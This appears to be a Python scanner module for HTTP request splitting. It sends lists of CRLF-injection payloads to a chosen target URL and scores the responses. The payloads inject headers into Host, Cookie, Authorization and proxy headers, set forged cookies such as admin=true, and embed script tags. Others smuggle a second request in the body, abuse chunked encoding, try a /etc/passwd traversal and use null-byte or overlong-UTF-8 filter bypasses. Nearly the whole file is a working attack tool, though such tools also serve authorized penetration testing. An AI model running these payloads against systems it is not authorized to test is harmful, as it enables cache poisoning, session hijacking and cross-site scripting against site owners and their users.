"""HTTP Request Splitting — CRLF injection in HTTP request headers/method/URI."""

import httpx
import urllib.parse
import time
import re
from typing import Optional


CRLF_PAYLOADS = [
    ("Host", [
        "target.com\r\nX-Injected: true",
        "target.com%0d%0aX-Injected:%20true",
        "target.com%0d%0a%0d%0a<script>alert(1)</script>",
        "target.com\r\n\r\n<html><body>test</body></html>",
        "target.com%0D%0AX-Injection:%20malicious",
    ]),
    ("User-Agent", [
        "Mozilla/5.0\r\nX-Injected: true",
        "Mozilla/5.0%0d%0aX-Injected:%20true",
        "Mozilla/5.0\r\nX-Forwarded-For: 127.0.0.1",
        "Mozilla/5.0%0d%0a%0d%0a<script>alert(1)</script>",
        "Mozilla/5.0\r\nX-Custom-Header: injected-value",
    ]),
    ("Referer", [
        "https://evil.com\r\nX-Injected: true",
        "https://evil.com%0d%0aX-Injected:%20true",
        "https://evil.com\r\n\r\n<html>injected</html>",
        "https://evil.com%0d%0aSet-Cookie:%20session=evil",
        "https://evil.com%0d%0aX-Forwarded-For:%20127.0.0.1",
    ]),
    ("Cookie", [
        "session=abc\r\nX-Injected: true",
        "session=abc%0d%0aX-Injected:%20true",
        "session=abc\r\nSet-Cookie: session=evil",
        "session=abc%0d%0a%0d%0a<script>alert(1)</script>",
        "session=abc\r\nX-Forwarded-For: 127.0.0.1",
    ]),
    ("Authorization", [
        "Bearer token\r\nX-Injected: true",
        "Bearer token%0d%0aX-Injected:%20true",
        "Bearer token\r\n\r\n<html>injected</html>",
        "Bearer token%0d%0aSet-Cookie:%20admin=true",
        "Bearer token\r\nX-Real-IP: 127.0.0.1",
    ]),
    ("Accept", [
        "text/html\r\nX-Injected: true",
        "text/html%0d%0aX-Injected:%20true",
        "text/html\r\n\r\n<script>alert(1)</script>",
        "text/html%0d%0aSet-Cookie:%20admin=true",
    ]),
    ("X-Forwarded-For", [
        "127.0.0.1\r\nX-Injected: true",
        "127.0.0.1%0d%0aX-Injected:%20true",
        "127.0.0.1\r\nX-Real-IP: 127.0.0.1",
        "127.0.0.1%0d%0a%0d%0a<script>alert(1)</script>",
    ]),
    ("Content-Type", [
        "application/json\r\nX-Injected: true",
        "application/json%0d%0aX-Injected:%20true",
        "application/json\r\n\r\n<html>injected</html>",
    ]),
]

LINE_ENDING_VARIANTS = [
    ("\r\n", "CRLF"),
    ("\r", "CR only"),
    ("\n", "LF only"),
    ("%0d%0a", "URL-encoded CRLF"),
    ("%0A", "URL-encoded LF"),
    ("%0D", "URL-encoded CR"),
    ("\r\n\r\n", "Double CRLF"),
    ("%0d%0a%0d%0a", "URL-encoded double CRLF"),
    ("\n\r", "LFCR"),
    ("%0a%0d", "URL-encoded LFCR"),
    ("\x00\r\n", "Null + CRLF"),
    ("\r\x00\n", "CR + Null + LF"),
]

REQUEST_LINE_PAYLOADS = [
    "GET / HTTP/1.0\r\nX-Injected: true\r\n\r\n",
    "GET /%0d%0aX-Injected:%20true HTTP/1.1\r\nHost: target\r\n\r\n",
    "GET / HTTP/1.1\r\nX-Injected: true\r\n\r\n",
    "GET / HTTP/1.0\r\nHost: evil.com\r\nX-Injected: true\r\n\r\n",
    "GET /../../../etc/passwd HTTP/1.1\r\nHost: target\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: target\r\nX-Injected: true\r\n\r\n",
    "CONNECT target.com:443 HTTP/1.1\r\nX-Injected: true\r\n\r\n",
    "OPTIONS / HTTP/1.1\r\nX-Injected: true\r\n\r\n",
]

PROXY_HEADER_PAYLOADS = [
    ("X-Forwarded-For", [
        "127.0.0.1\r\nX-Injected: true",
        "127.0.0.1%0d%0aX-Injected:%20true",
        "127.0.0.1, 10.0.0.1\r\nX-Injected: true",
        "127.0.0.1\r\nX-Real-IP: 127.0.0.1",
        "::1\r\nX-Injected: true",
    ]),
    ("Via", [
        "1.1 target.com\r\nX-Injected: true",
        "1.1 target.com%0d%0aX-Injected:%20true",
        "1.1 proxy\r\nX-Forwarded-For: 127.0.0.1",
    ]),
    ("X-Real-IP", [
        "127.0.0.1\r\nX-Injected: true",
        "127.0.0.1%0d%0aX-Injected:%20true",
    ]),
    ("X-Forwarded-Host", [
        "evil.com\r\nX-Injected: true",
        "evil.com%0d%0aX-Injected:%20true",
        "evil.com\r\nX-Forwarded-For: 127.0.0.1",
    ]),
    ("X-Forwarded-Proto", [
        "https\r\nX-Injected: true",
        "https%0d%0aX-Injected:%20true",
    ]),
]

CHUNKED_PAYLOADS = [
    "5\r\nhello\r\n0\r\n\r\n",
    "0\r\nX-Injected: true\r\n\r\n",
    "5\r\nhello\r\nX-Injected: true\r\n0\r\n\r\n",
    "5\r\nhello\r\n0\r\nX-Injected: true\r\n\r\n",
    "0\r\n\r\nX-Injected: true\r\n\r\n",
    "a\r\n0123456789\r\n0\r\n\r\n",
    "5\r\nhello\r\n5\r\nworld\r\n0\r\n\r\nX-Injected: true\r\n\r\n",
]

BODY_SPLIT_PAYLOADS = [
    "\r\n\r\nGET /injected HTTP/1.1\r\nHost: target\r\n\r\n",
    "%0d%0a%0d%0aGET%20/injected%20HTTP/1.1%0d%0aHost:%20target%0d%0a%0d%0a",
    "\r\n\r\nPOST /injected HTTP/1.1\r\nHost: target\r\nContent-Length: 0\r\n\r\n",
    "\n\nGET /injected HTTP/1.1\nHost: target\n\n",
    "\r\n\r\n<html><body>injected</body></html>",
    "\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html>injected</html>",
]

UNICODE_PAYLOADS = [
    ("\u2028", "Unicode line separator"),
    ("\u2029", "Unicode paragraph separator"),
    ("\u000d\u000a", "Unicode CRLF"),
    ("\r\n", "Regular CRLF"),
    ("\r", "CR"),
    ("\n", "LF"),
    ("%E2%80%A8", "URL-encoded line separator"),
    ("%E2%80%A9", "URL-encoded paragraph separator"),
    ("\xc0\x8a", "Overlong UTF-8 LF"),
    ("\xc0\x8d", "Overlong UTF-8 CR"),
    ("\xe0\x80\x8a", "3-byte overlong LF"),
    ("\xe0\x80\x8d", "3-byte overlong CR"),
]

CONNECTION_ABUSE_PAYLOADS = [
    "Connection: keep-alive\r\nX-Injected: true",
    "Connection: close\r\nX-Injected: true",
    "Connection: keep-alive\r\n\r\nGET /injected HTTP/1.1\r\nHost: target\r\n\r\n",
    "Connection: Upgrade\r\nUpgrade: websocket\r\n\r\n",
    "Connection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n",
]

HTTP_VERSION_PAYLOADS = [
    ("HTTP/1.0", "GET / HTTP/1.0\r\nHost: target\r\nX-Injected: true\r\n\r\n"),
    ("HTTP/1.1", "GET / HTTP/1.1\r\nHost: target\r\nX-Injected: true\r\n\r\n"),
    ("HTTP/2", "GET / HTTP/2\r\nHost: target\r\nX-Injected: true\r\n\r\n"),
]


async def _detect_target(client: httpx.AsyncClient, target: str) -> str:
    parsed = urllib.parse.urlparse(target)
    if not parsed.scheme:
        target = "http://" + target
        parsed = urllib.parse.urlparse(target)
    return target


async def _test_crlf_header_injection(client: httpx.AsyncClient, target: str) -> list[dict]:
    findings = []
    for header_name, payloads in CRLF_PAYLOADS:
        for payload in payloads:
            try:
                headers = {header_name: payload}
                resp = await client.get(target, headers=headers, timeout=15, follow_redirects=False)
                resp_text = resp.text[:500]
                resp_headers = dict(resp.headers)
                if "x-injected" in {k.lower(): v for k, v in resp_headers.items()}:
                    findings.append({
                        "risk": "CRITICAL",
                        "confidence": "confirmed",
                        "technique": "header_injection_via_crlf",
                        "evidence": f"Header '{header_name}' with CRLF payload injected X-Injected header. Status: {resp.status_code}",
                        "header": header_name,
                        "payload": payload[:100],
                    })
                elif "x-injected" in resp_text.lower():
                    findings.append({
                        "risk": "CRITICAL",
                        "confidence": "confirmed",
                        "technique": "header_injection_reflected",
                        "evidence": f"Injected header reflected in response body. Status: {resp.status_code}",
                        "header": header_name,
                        "payload": payload[:100],
                    })
                elif "set-cookie" in {k.lower(): v for k, v in resp_headers.items()} and "injected" in str(resp_headers).lower():
                    findings.append({
                        "risk": "HIGH",
                        "confidence": "confirmed",
                        "technique": "cookie_injection_via_crlf",
                        "evidence": f"Cookie injection via '{header_name}'. Status: {resp.status_code}",
                        "header": header_name,
                        "payload": payload[:100],
                    })
                elif "location" in {k.lower(): v for k, v in resp_headers.items()} and "evil" in str(resp_headers).lower():
                    findings.append({
                        "risk": "HIGH",
                        "confidence": "confirmed",
                        "technique": "redirect_injection_via_crlf",
                        "evidence": f"Redirect injection via '{header_name}'. Status: {resp.status_code}",
                        "header": header_name,
                        "payload": payload[:100],
                    })
            except Exception:
                pass
    return findings


async def _test_line_ending_variants(client: httpx.AsyncClient, target: str) -> list[dict]:
    findings = []
    for encoding, name in LINE_ENDING_VARIANTS:
        if encoding.startswith("%"):
            payload = f"Mozilla/5.0{encoding}X-Injected:true"
        else:
            payload = f"Mozilla/5.0{encoding}X-Injected:true"
        try:
            headers = {"User-Agent": payload}
            resp = await client.get(target, headers=headers, timeout=15, follow_redirects=False)
            resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            if "x-injected" in resp_headers_lower:
                findings.append({
                    "risk": "CRITICAL",
                    "confidence": "confirmed",
                    "technique": "crlf_line_ending_bypass",
                    "evidence": f"Line ending variant '{name}' bypassed filtering",
                    "encoding": name,
                    "payload": payload[:100],
                })
        except Exception:
            pass
    return findings


async def _test_unicode_bypass(client: httpx.AsyncClient, target: str) -> list[dict]:
    findings = []
    for encoding, name in UNICODE_PAYLOADS:
        payload = f"Mozilla/5.0{encoding}X-Injected:true"
        try:
            headers = {"User-Agent": payload}
            resp = await client.get(target, headers=headers, timeout=15, follow_redirects=False)
            resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            if "x-injected" in resp_headers_lower:
                findings.append({
                    "risk": "CRITICAL",
                    "confidence": "confirmed",
                    "technique": "unicode_bypass",
                    "evidence": f"Unicode bypass '{name}' succeeded in injecting header",
                    "encoding": name,
                    "payload": repr(payload)[:100],
                })
        except Exception:
            pass
    return findings


async def _test_request_line_splitting(client: httpx.AsyncClient, target: str) -> list[dict]:
    findings = []
    parsed = urllib.parse.urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}"
    for raw_request in REQUEST_LINE_PAYLOADS:
        try:
            url = base + "/"
            method = raw_request.split(" ")[0]
            path = raw_request.split(" ")[1] if len(raw_request.split(" ")) > 1 else "/"
            start = time.time()
            resp = await client.request(
                method=method,
                url=base + path,
                headers={"Host": parsed.netloc},
                timeout=15,
                follow_redirects=False,
            )
            elapsed = time.time() - start
            resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            if "x-injected" in resp_headers_lower:
                findings.append({
                    "risk": "CRITICAL",
                    "confidence": "confirmed",
                    "technique": "request_line_splitting",
                    "evidence": f"Request line splitting succeeded. Method: {method}",
                    "method": method,
                    "payload": raw_request[:150],
                })
            elif "evil" in str(resp_headers_lower).lower():
                findings.append({
                    "risk": "HIGH",
                    "confidence": "confirmed",
                    "technique": "request_line_host_manipulation",
                    "evidence": f"Request line manipulated host header",
                    "method": method,
                    "payload": raw_request[:150],
                })
            elif resp.status_code in (400, 403, 502):
                findings.append({
                    "risk": "INFO",
                    "confidence": "possible",
                    "technique": "request_line_filtered",
                    "evidence": f"Malformed request line rejected (HTTP {resp.status_code})",
                    "method": method,
                })
        except Exception:
            pass
    return findings


async def _test_proxy_header_splitting(client: httpx.AsyncClient, target: str) -> list[dict]:
    findings = []
    for header_name, payloads in PROXY_HEADER_PAYLOADS:
        for payload in payloads:
            try:
                headers = {header_name: payload}
                resp = await client.get(target, headers=headers, timeout=15, follow_redirects=False)
                resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}
                if "x-injected" in resp_headers_lower:
                    findings.append({
                        "risk": "CRITICAL",
                        "confidence": "confirmed",
                        "technique": "proxy_header_splitting",
                        "evidence": f"Proxy header '{header_name}' splitting succeeded",
                        "header": header_name,
                        "payload": payload[:100],
                    })
                elif "x-forwarded" in resp_headers_lower and "injected" in str(resp_headers_lower):
                    findings.append({
                        "risk": "HIGH",
                        "confidence": "confirmed",
                        "technique": "proxy_header_chain_injection",
                        "evidence": f"Proxy header chain injection via '{header_name}'",
                        "header": header_name,
                        "payload": payload[:100],
                    })
            except Exception:
                pass
    return findings


async def _test_chunked_encoding(client: httpx.AsyncClient, target: str) -> list[dict]:
    findings = []
    for payload in CHUNKED_PAYLOADS:
        try:
            raw = f"POST / HTTP/1.1\r\nHost: {urllib.parse.urlparse(target).netloc}\r\nTransfer-Encoding: chunked\r\n\r\n{payload}"
            resp = await client.post(
                target,
                content=payload.encode() if isinstance(payload, str) else payload,
                headers={
                    "Transfer-Encoding": "chunked",
                    "Content-Type": "application/octet-stream",
                },
                timeout=15,
                follow_redirects=False,
            )
            resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            resp_text = resp.text[:500]
            if "x-injected" in resp_headers_lower or "x-injected" in resp_text.lower():
                findings.append({
                    "risk": "CRITICAL",
                    "confidence": "confirmed",
                    "technique": "chunked_encoding_splitting",
                    "evidence": f"Chunked encoding splitting succeeded. Status: {resp.status_code}",
                    "payload": payload[:150],
                })
            elif resp.status_code in (500, 502, 503):
                findings.append({
                    "risk": "MEDIUM",
                    "confidence": "possible",
                    "technique": "chunked_encoding_confusion",
                    "evidence": f"Chunked encoding caused server error (HTTP {resp.status_code})",
                    "payload": payload[:150],
                })
        except Exception:
            pass
    return findings


async def _test_body_splitting(client: httpx.AsyncClient, target: str) -> list[dict]:
    findings = []
    for payload in BODY_SPLIT_PAYLOADS:
        try:
            resp = await client.post(
                target,
                content=payload.encode() if isinstance(payload, str) else payload,
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": str(len(payload)),
                },
                timeout=15,
                follow_redirects=False,
            )
            resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            resp_text = resp.text[:500]
            if "x-injected" in resp_headers_lower or "injected" in resp_text.lower():
                findings.append({
                    "risk": "CRITICAL",
                    "confidence": "confirmed",
                    "technique": "request_body_splitting",
                    "evidence": f"Request body splitting succeeded. Status: {resp.status_code}",
                    "payload": repr(payload)[:150],
                })
            elif resp.status_code in (400, 404, 500, 502):
                findings.append({
                    "risk": "MEDIUM",
                    "confidence": "possible",
                    "technique": "body_splitting_error",
                    "evidence": f"Body splitting caused error (HTTP {resp.status_code}). May be filtered or partial.",
                    "payload": repr(payload)[:150],
                })
        except Exception:
            pass
    return findings


async def _test_http_version_differences(client: httpx.AsyncClient, target: str) -> list[dict]:
    findings = []
    for version, _ in HTTP_VERSION_PAYLOADS:
        try:
            resp = await client.get(
                target,
                headers={
                    "User-Agent": f"Mozilla/5.0\r\nX-Injected-{version}: true",
                },
                timeout=15,
                follow_redirects=False,
            )
            resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            injected_key = f"x-injected-{version}".lower()
            if injected_key in resp_headers_lower:
                findings.append({
                    "risk": "CRITICAL",
                    "confidence": "confirmed",
                    "technique": "http_version_splitting",
                    "evidence": f"HTTP version {version} accepted CRLF injection in User-Agent",
                    "version": version,
                })
            else:
                findings.append({
                    "risk": "INFO",
                    "confidence": "none",
                    "technique": "http_version_tested",
                    "evidence": f"HTTP version {version} tested, no injection detected",
                    "version": version,
                })
        except Exception:
            pass
    return findings


async def _test_connection_abuse(client: httpx.AsyncClient, target: str) -> list[dict]:
    findings = []
    for payload in CONNECTION_ABUSE_PAYLOADS:
        try:
            headers = {}
            for line in payload.split("\r\n"):
                if ":" in line:
                    k, v = line.split(":", 1)
                    headers[k.strip()] = v.strip()
            resp = await client.get(target, headers=headers, timeout=15, follow_redirects=False)
            resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            if "x-injected" in resp_headers_lower:
                findings.append({
                    "risk": "HIGH",
                    "confidence": "confirmed",
                    "technique": "connection_abuse",
                    "evidence": f"Connection abuse injection succeeded",
                    "payload": payload[:150],
                })
        except Exception:
            pass
    return findings


async def _test_response_analysis(client: httpx.AsyncClient, target: str) -> list[dict]:
    findings = []
    try:
        resp = await client.get(target, timeout=15, follow_redirects=False)
        resp_headers = {k.lower(): v for k, v in resp.headers.items()}
        server = resp_headers.get("server", "")
        via = resp_headers.get("via", "")
        x_cache = resp_headers.get("x-cache", "")
        x_powered_by = resp_headers.get("x-powered-by", "")
        findings.append({
            "risk": "INFO",
            "confidence": "none",
            "technique": "server_fingerprint",
            "evidence": f"Server: {server}, Via: {via}, Cache: {x_cache}, X-Powered-By: {x_powered_by}",
            "server": server,
            "via": via,
            "cache": x_cache,
            "powered_by": x_powered_by,
        })
        if resp_headers.get("content-type", "").startswith("text/html"):
            cache_headers = ["age", "x-cache", "x-cache-hit", "cf-cache-status", "x-varnish", "x-fastly"]
            for ch in cache_headers:
                if ch in resp_headers:
                    findings.append({
                        "risk": "MEDIUM",
                        "confidence": "possible",
                        "technique": "cache_detected",
                        "evidence": f"Cache header detected: {ch}: {resp_headers[ch]}. Cache poisoning may be possible.",
                        "cache_header": ch,
                    })
                    break
        if "transfer-encoding" in resp_headers:
            findings.append({
                "risk": "INFO",
                "confidence": "confirmed",
                "technique": "chunked_transfer_detected",
                "evidence": f"Server uses chunked transfer-encoding: {resp_headers['transfer-encoding']}",
            })
    except Exception:
        pass
    return findings


async def _test_null_byte(client: httpx.AsyncClient, target: str) -> list[dict]:
    findings = []
    null_payloads = [
        "Mozilla/5.0%00\r\nX-Injected: true",
        "Mozilla/5.0\x00\r\nX-Injected: true",
        "Mozilla/5.0%00%0d%0aX-Injected:%20true",
        "session=abc%00\r\nX-Injected: true",
    ]
    for payload in null_payloads:
        try:
            headers = {"User-Agent": payload}
            resp = await client.get(target, headers=headers, timeout=15, follow_redirects=False)
            resp_headers_lower = {k.lower(): v for k, v in resp.headers.items()}
            if "x-injected" in resp_headers_lower:
                findings.append({
                    "risk": "CRITICAL",
                    "confidence": "confirmed",
                    "technique": "null_byte_splitting",
                    "evidence": f"Null byte splitting succeeded with payload: {payload[:80]}",
                    "payload": payload[:100],
                })
        except Exception:
            pass
    return findings


async def http_request_splitting(target: str) -> dict:
    """HTTP Request Splitting — CRLF injection in HTTP request headers/method/URI.

    Args:
        target: Target URL to test (e.g., https://example.com)

    Returns:
        dict with findings, risk, and evidence
    """
    parsed = urllib.parse.urlparse(target)
    if not parsed.scheme:
        target = "http://" + target
        parsed = urllib.parse.urlparse(target)

    all_findings = []

    async with httpx.AsyncClient(
        verify=False,
        follow_redirects=False,
        headers={
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate",
        },
        timeout=15,
    ) as client:
        all_findings.extend(await _test_crlf_header_injection(client, target))
        all_findings.extend(await _test_line_ending_variants(client, target))
        all_findings.extend(await _test_unicode_bypass(client, target))
        all_findings.extend(await _test_null_byte(client, target))
        all_findings.extend(await _test_request_line_splitting(client, target))
        all_findings.extend(await _test_proxy_header_splitting(client, target))
        all_findings.extend(await _test_chunked_encoding(client, target))
        all_findings.extend(await _test_body_splitting(client, target))
        all_findings.extend(await _test_http_version_differences(client, target))
        all_findings.extend(await _test_connection_abuse(client, target))
        all_findings.extend(await _test_response_analysis(client, target))

    risk_weights = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "INFO": 0}
    max_risk = "INFO"
    for f in all_findings:
        r = f.get("risk", "INFO")
        if risk_weights.get(r, 0) > risk_weights.get(max_risk, 0):
            max_risk = r

    confirmed_count = sum(1 for f in all_findings if f.get("confidence") == "confirmed")
    techniques_tested = list(set(f.get("technique", "") for f in all_findings))

    return {
        "target": target,
        "risk": max_risk,
        "total_findings": len(all_findings),
        "confirmed_findings": confirmed_count,
        "techniques_tested": techniques_tested,
        "findings": all_findings,
        "summary": {
            "header_injection": any("header_injection" in f["technique"] for f in all_findings),
            "request_line_splitting": any("request_line" in f["technique"] for f in all_findings),
            "chunked_abuse": any("chunked" in f["technique"] for f in all_findings),
            "body_splitting": any("body_splitting" in f["technique"] for f in all_findings),
            "proxy_injection": any("proxy" in f["technique"] for f in all_findings),
            "null_byte": any("null_byte" in f["technique"] for f in all_findings),
            "unicode_bypass": any("unicode" in f["technique"] for f in all_findings),
            "line_ending_bypass": any("line_ending" in f["technique"] for f in all_findings),
        },
    }
